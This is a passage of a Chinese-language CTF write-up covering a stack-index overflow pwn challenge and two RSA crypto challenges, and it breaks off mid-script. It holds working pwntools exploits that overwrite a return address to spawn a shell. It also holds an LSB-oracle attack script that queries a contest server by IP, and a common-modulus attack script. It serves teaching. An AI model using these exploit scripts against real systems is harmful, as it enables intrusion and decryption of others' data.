)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v6);</span><br><span class="line">          <span class="keyword">if</span> ( v6 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Give me your number"</span>);</span><br><span class="line">          __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">          <span class="keyword">if</span> ( j &lt;= <span class="number">0x63</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v3 = j++;</span><br><span class="line">            v13[v3] = v7;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"id\t\tnumber"</span>);</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; j; ++k )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%d\t\t%d\n"</span>, k, v13[k]);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">      v13[v5] = v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt; j; ++l )</span><br><span class="line">      v9 += v13[l];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还能看到有一个<code>hackhere</code>函数，直接调用了<code>system(&quot;/bin/bash&quot;)</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"which number to change:"</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"new number:"</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v7);</span><br><span class="line">v13[v5] = v7; <span class="comment">// index out of bound</span></span><br></pre></td></tr></table></figure>
<p>这里发现v5和v7没有做任何检查，能达到任意地址写。</p>
<p>所以这题的思路就是将<code>main</code>函数return地址覆盖为<code>hackhere</code>的地址。</p>
<p><img src="/pics/2018-QCTF-writeup/18.png" alt="hackhere"></p>
<p>基本就是ret到hackhere然后直接就成功了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">p = process(<span class="string">'./stack2'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index, content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'5. exit\n'</span>, <span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'which number to change:\n'</span>, str(index))</span><br><span class="line">	p.sendlineafter(<span class="string">'new number:\n'</span>, str(content))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'How many numbers you have:\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Give me your numbers\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">hack_addr = <span class="number">0x0804859b</span></span><br><span class="line">offset = <span class="number">132</span></span><br><span class="line"><span class="comment"># gdb.attach(p, 'b *0x0804859b')</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	byte = (hack_addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">	byte = str(ctypes.c_int8(byte))</span><br><span class="line">	start = byte.find(<span class="string">'('</span>) + <span class="number">1</span></span><br><span class="line">	end = byte.find(<span class="string">')'</span>)</span><br><span class="line">	byte = int(byte[start:end])</span><br><span class="line">	change(offset + i, byte)</span><br><span class="line">p.sendlineafter(<span class="string">'5. exit\n'</span>, <span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>但发现远程没有bash，所以想到直接用字符串中的sh，即<code>system(&amp;&quot;/bin/bash&quot;[7])</code>，只需要找到字符串在栈上的位置：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">p = process(<span class="string">'./stack2'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index, content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'5. exit\n'</span>, <span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'which number to change:\n'</span>, str(index))</span><br><span class="line">	p.sendlineafter(<span class="string">'new number:\n'</span>, str(content))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'How many numbers you have:\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Give me your numbers\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">hack_addr = <span class="number">0x0804859b</span></span><br><span class="line">offset = <span class="number">132</span></span><br><span class="line"><span class="comment"># gdb.attach(p, 'b *0x0804859b')</span></span><br><span class="line"><span class="comment"># overflow ret</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	byte = (hack_addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">	byte = str(ctypes.c_int8(byte))</span><br><span class="line">	start = byte.find(<span class="string">'('</span>) + <span class="number">1</span></span><br><span class="line">	end = byte.find(<span class="string">')'</span>)</span><br><span class="line">	byte = int(byte[start:end])</span><br><span class="line">	change(offset + i, byte)</span><br><span class="line">str_addr = <span class="number">0x08048987</span></span><br><span class="line">offset2 = offset + <span class="number">8</span></span><br><span class="line"><span class="comment"># point to string 'sh'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	byte = (str_addr &gt;&gt; (i * <span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">	byte = str(ctypes.c_int8(byte))</span><br><span class="line">	start = byte.find(<span class="string">'('</span>) + <span class="number">1</span></span><br><span class="line">	end = byte.find(<span class="string">')'</span>)</span><br><span class="line">	byte = int(byte[start:end])</span><br><span class="line">	change(offset2 + i, byte)</span><br><span class="line">p.sendlineafter(<span class="string">'5. exit\n'</span>, <span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>题目信息如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">e = 0x10001</span><br><span class="line"></span><br><span class="line">n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span><br><span class="line"></span><br><span class="line">c = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span><br></pre></td></tr></table></figure>
<p><a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">最低有效位攻击</a>了解一下。</p>
<p>对密文乘<code>2^e(mod n)</code>操作,再解密的时候，如果为偶数，说明明文再<code>(0, n/2)</code>之间，否则在<code>(n/2, n)</code>之间。这样，只需要<code>log n</code>的次数就可以知道明文。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'WARN'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_bytes</span><span class="params">(n)</span>:</span></span><br><span class="line">    b = hex(n)[<span class="number">2</span>:].strip(<span class="string">'L'</span>)</span><br><span class="line">    b = <span class="string">'0'</span> + b <span class="keyword">if</span> len(b)%<span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> b</span><br><span class="line">    <span class="keyword">return</span> b.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716db</span></span><br><span class="line">c = <span class="number">0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</span></span><br><span class="line"></span><br><span class="line">upper = n</span><br><span class="line">lower = <span class="number">0</span></span><br><span class="line">k = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">  p = remote(<span class="string">'47.96.239.28'</span>,<span class="number">23333</span>)</span><br><span class="line">  p.recvuntil(<span class="string">'You can input ciphertext(hexdecimal) now\n'</span>)</span><br><span class="line">  power = pow(<span class="number">2</span>, k, n)</span><br><span class="line">  new_c = (pow(power, e, n) * c) % n</span><br><span class="line">  new_c = hex(new_c)[<span class="number">2</span>:].strip(<span class="string">'L'</span>)</span><br><span class="line">  p.sendline(new_c)</span><br><span class="line">  data = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">  p.close()</span><br><span class="line">  <span class="keyword">if</span> data == <span class="string">"even"</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Round %d: even'</span> % k</span><br><span class="line">    upper = (upper + lower) / <span class="number">2</span></span><br><span class="line">  <span class="keyword">if</span> data == <span class="string">"odd"</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Round %d: odd'</span> % k</span><br><span class="line">    lower = (upper + lower) / <span class="number">2</span></span><br><span class="line">  <span class="keyword">if</span> data == <span class="string">"error"</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">if</span> upper - lower &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = num_to_bytes(upper)[:<span class="number">-1</span>]+<span class="string">'&#125;'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, flag</span><br></pre></td></tr></table></figure>
<h2 id="Xman-RSA"><a href="#Xman-RSA" class="headerlink" title="Xman-RSA"></a>Xman-RSA</h2><p>拿到四个文件后，其中有一个很像python的脚本，通过对关键字等的判断，自己写脚本还原：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">l1 = &#123;</span><br><span class="line">    <span class="string">'a'</span>: <span class="string">'d'</span>,</span><br><span class="line">    <span class="string">'b'</span>: <span class="string">'m'</span>,</span><br><span class="line">    <span class="string">'d'</span>: <span class="string">'e'</span>,</span><br><span class="line">    <span class="string">'e'</span>: <span class="string">'n'</span>,</span><br><span class="line">    <span class="string">'f'</span>: <span class="string">'w'</span>,</span><br><span class="line">    <span class="string">'g'</span>: <span class="string">'f'</span>,</span><br><span class="line">    <span class="string">'h'</span>: <span class="string">'o'</span>,</span><br><span class="line">    <span class="string">'i'</span>: <span class="string">'x'</span>,</span><br><span class="line">    <span class="string">'j'</span>: <span class="string">'g'</span>,</span><br><span class="line">    <span class="string">'k'</span>: <span class="string">'p'</span>,</span><br><span class="line">    <span class="string">'l'</span>: <span class="string">'y'</span>,</span><br><span class="line">    <span class="string">'m'</span>: <span class="string">'h'</span>,</span><br><span class="line">    <span class="string">'p'</span>: <span class="string">'i'</span>,</span><br><span class="line">    <span class="string">'q'</span>: <span class="string">'r'</span>,</span><br><span class="line">    <span class="string">'r'</span>: <span class="string">'a'</span>,</span><br><span class="line">    <span class="string">'t'</span>: <span class="string">'s'</span>,</span><br><span class="line">    <span class="string">'u'</span>: <span class="string">'b'</span>,</span><br><span class="line">    <span class="string">'v'</span>: <span class="string">'k'</span>,</span><br><span class="line">    <span class="string">'w'</span>: <span class="string">'t'</span>,</span><br><span class="line">    <span class="string">'x'</span>: <span class="string">'c'</span>,</span><br><span class="line">    <span class="string">'y'</span>: <span class="string">'l'</span>,</span><br><span class="line">    <span class="string">'z'</span>: <span class="string">'u'</span></span><br><span class="line">&#125;</span><br><span class="line">f = open(<span class="string">'encryption.encrypted'</span>, <span class="string">'r'</span>)</span><br><span class="line">ans = f.read()</span><br><span class="line"><span class="comment"># print ans</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> ans:</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> l1.items():</span><br><span class="line">        <span class="keyword">if</span> ch == key:</span><br><span class="line">            res += value</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += ch</span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line">raw_input()</span><br><span class="line">f = open(<span class="string">'1.py'</span>, <span class="string">'wb'</span>)</span><br><span class="line">f.write(res)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>还原出原来的加密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_num</span><span class="params">(b)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> int(b.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_bytes</span><span class="params">(n)</span>:</span></span><br><span class="line">	b = hex(n)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">	b = <span class="string">'0'</span> + b <span class="keyword">if</span> len(b)%<span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> b</span><br><span class="line">	<span class="keyword">return</span> b.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_prime</span><span class="params">(l)</span>:</span></span><br><span class="line">	random_seed = urandom(l)</span><br><span class="line"></span><br><span class="line">	num = bytes_to_num(random_seed)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">		<span class="keyword">if</span> is_prime(num):</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		num+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s, e, n)</span>:</span></span><br><span class="line">	p = bytes_to_num(s)</span><br><span class="line">	p = pow(p, e, n)</span><br><span class="line">	<span class="keyword">return</span> num_to_bytes(p).encode(<span class="string">'hex'</span>)	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">separate</span><span class="params">(n)</span>:</span></span><br><span class="line">	p = n % <span class="number">4</span></span><br><span class="line">	t = (p*p) % <span class="number">4</span></span><br><span class="line">	<span class="keyword">return</span> t == <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">f = open(<span class="string">'flag.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">		</span><br><span class="line">msg1 = <span class="string">""</span></span><br><span class="line">msg2 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">	<span class="keyword">if</span> separate(i): <span class="comment"># 奇数</span></span><br><span class="line">		msg2 += flag[i]</span><br><span class="line">	<span class="keyword">else</span>: <span class="comment"># 偶数</span></span><br><span class="line">		msg1 += flag[i]</span><br><span class="line"></span><br><span class="line">p1 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p2 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p3 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n1 = p1*p2</span><br><span class="line">n2 = p1*p3</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">c1 = encrypt(msg1, e, n1)</span><br><span class="line">c2 = encrypt(msg2, e, n2)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">p4 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">p5 = get_a_prime(<span class="number">128</span>)</span><br><span class="line">n3 = p4*p5</span><br><span class="line">c1 = num_to_bytes(pow(n1, e1, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">c2 = num_to_bytes(pow(n1, e2, n3)).encode(<span class="string">'hex'</span>)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(num_to_bytes(n2)))</span><br><span class="line">print(base64.b64encode(num_to_bytes(n3)))</span><br></pre></td></tr></table></figure>
<p>代码看完后，思路是先用共模攻击解出<code>n1</code>，之后利用公约数得到<code>p1</code>、<code>p2</code>、<code>p3</code>，再求出<code>d1</code>、<code>d2</code>，最后解出<code>msg1</code>、<code>msg2</code>。给出的文件中，<code>ciphertext</code>为第二次输出的<code>c1</code>和<code>c2</code>，，<code>n1.encrypted</code>为第二次输出的<code>c1</code>和<code>c2</code>，<code>n2&amp;n3</code>即最后输出的被加密后的<code>n2</code>和<code>n3</code>。解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = open(<span class="string">'n2&amp;n3'</span>, <span class="string">'rb'</span>)</span><br><span class="line">n2 = f.readline()</span><br><span class="line">n3 = f.readline()</span><br><span class="line">f.close()</span><br><span class="line">n2 = base64.b64decode(n2).encode(<span class="string">'hex'</span>)</span><br><span class="line">n3 = base64.b64decode(n3).encode(<span class="string">'hex'</span>)</span><br><span class="line">n2 = int(n2, <span class="number">16</span>)</span><br><span class="line">n3 = int(n3, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># print 'n2:', n2</span></span><br><span class="line"><span class="comment"># print 'n3:', n3</span></span><br><span class="line"><span class="comment"># first step: solve n1</span></span><br><span class="line">e1 = <span class="number">0x1001</span></span><br><span class="line">e2 = <span class="number">0x101</span></span><br><span class="line">f = open(<span class="string">'n1.encrypted'</span>, <span class="string">'rb'</span>)</span><br><span class="line">n1_c1 = f.readline()</span><br><span class="line">n1_c2 = f.readline()</span><br><span class="line">f.close()</span><br><span class="line">n1_c1 = int(n1_c1, <span class="number">16</span>)</span><br><span class="line">n1_c2 = int(n1_c2, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># print 'n1_c1:', n1_c1</span></span><br><span class="line"><span class="comment"># print 'n1_c2:', n1_c2</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = abs(s)</span><br><span class="line">    n1_c1 = gmpy2.invert(n1_c1, n3)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = abs(t)</span><br><span class="line">    n1_c2 = gmpy2.invert(n1_c2, n3)</span><br><span class="line">n1 = gmpy2.powmod(n1_c1, s, n3) * gmpy2.powmod(n1_c2, t, n3) % n3</span><br><span class="line"><span class="keyword">print</span> <span class="string">'n1:'</span>, n1</span><br><span class="line"><span class="comment"># second step: solve flag</span></span><br><span class="line">f = open(<span 